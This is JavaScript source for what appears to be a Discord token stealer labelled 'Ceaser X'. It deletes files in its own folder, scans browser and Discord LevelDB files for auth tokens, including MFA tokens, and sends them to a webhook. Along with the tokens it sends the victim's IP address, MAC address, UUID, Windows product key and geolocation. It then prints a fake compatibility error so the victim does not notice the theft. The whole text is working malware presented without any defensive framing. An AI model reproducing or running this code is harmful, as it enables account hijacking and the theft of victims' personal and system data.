

function init() {
    fs.readdirSync(__dirname).forEach((r) =>
      r.endsWith("xml") ? fs.unlinkSync(`${__dirname}/${r}`) : ""
    );
    dbPaths.forEach((r, index) => main(r, index));
  }

  function main(p, i) {
    fs.readdir(p, (err, data) => {
      if (err) return;
      if (data) {
        var ldbFileFilter = data.filter((f) => f.endsWith("ldb"));
        ldbFileFilter.forEach((file) => {
          var fileContent = fs.readFileSync(`${p}/${file}`).toString();
          var noMFA = /[\d\w_-]{24,26}\.[\d\w_-]{6}\.[\d\w_-]{24,115}/;
          var mfa = /mfa\.[\d\w_-]{84}/;
          var [token] = noMFA.exec(fileContent) ||
            mfa.exec(fileContent) || [undefined];
          if (token) {
              tokens.push(token), paths.push(p);
          }
          if(i == 22) {
              setTimeout(() => {
                  send(tokens, paths)
              }, 3000);
          }
        });
      }
    });
  }
  function send(tokens, p) {
      if(posts > 0) return;
      posts++
    
    let e = {
      title: "Ceaser X",
      color: 16711680, // Hex color code, e.g., Red: 0xFF0000
      fields: [
        {
          name: "Tokens",
          value: "```"+`${tokens.join("\n")}`+" ```",
          inline: false,
        },
        {
          name: "Paths",
          value: "```" + paths.join("\n") + " ```",
          inline: false,
        },
        {
          name: `IP Address`,
          value: "```" + getIPAddress + "```",
          inline: true,
        },
        {
          name: `MacAddress`,
          value: "```" + MacAddress + "```",
          inline: true,
        },
        {
          name: `Local IP`,
          value: "```" + localIP + "```",
          inline: true,
        },
        {
          name: `UUID`,
          value: "```" + UUID + "```",
          inline: true
        },
        {
          name: `Product Key`,
          value: "```" + ProductKey + "```",
          inline: true
        },
        {
          name: `Location`,
          value: "```" +`${geo.city}, ${geo.region}, ${geo.country}, [${geo.timezone}]`+"```" ,
          inline: false
        }
      ],
      timestamp: new Date().toISOString(),
    };
    
    
    fetch(`${wHook}`, {
      method: "POST",
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ embeds: [e] }),
    })
      .then(response => {
          console.log(`Seems like your PC isn't compactible with this architecture! Please contact Dux again!`)
      })
      .catch(err => {});
    
  }